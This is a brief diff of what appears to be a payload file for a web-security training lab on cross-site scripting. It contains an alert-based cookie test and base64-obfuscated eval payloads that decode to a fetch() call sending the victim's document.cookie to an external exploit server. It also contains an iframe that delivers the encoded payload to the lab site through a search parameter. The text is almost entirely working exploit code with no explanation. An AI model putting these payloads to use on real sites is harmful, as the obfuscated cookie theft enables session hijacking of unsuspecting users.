@@ -2,7 +2,7 @@ using payload:
 "+alert(document['cookie'])}//
 
 
-"+eval(atob("ZmV0Y2goJ2h0dHBzOi8vZXhwbG9pdC0wYTM4MDA1YjA0N2FlNzgwODI4MmE2MDcwMTMyMDAyZC5leHBsb2l0LXNlcnZlci5uZXQvP2M9JytidG9hKGRvY3VtZW50Wydjb29raWUnXSkp"))}//
+"+eval(atob("ZmV0Y2goJ2h0dHBzOi8vZXhwbG9pdC0wYTRiMDBhYTAzOGNjMWNmODNjYWM3MGQwMTEwMDAwOS5leHBsb2l0LXNlcnZlci5uZXQvP2M9JytidG9hKGRvY3VtZW50Wydjb29raWUnXSkpCgoK"))}//
 
 <iframe src = "https://0a5b00340465e70082c1a72d00fe00f6.web-security-academy.net/?SearchTerm=%22%2Beval%28atob%28%22ZmV0Y2goJ2h0dHBzOi8vZXhwbG9pdC0wYTM4MDA1YjA0N2FlNzgwODI4MmE2MDcwMTMyMDAyZC5leHBsb2l0LXNlcnZlci5uZXQvP2M9JytidG9hKGRvY3VtZW50Wydjb29raWUnXSkp%22%29%29%7D%2F%2F"/>
 
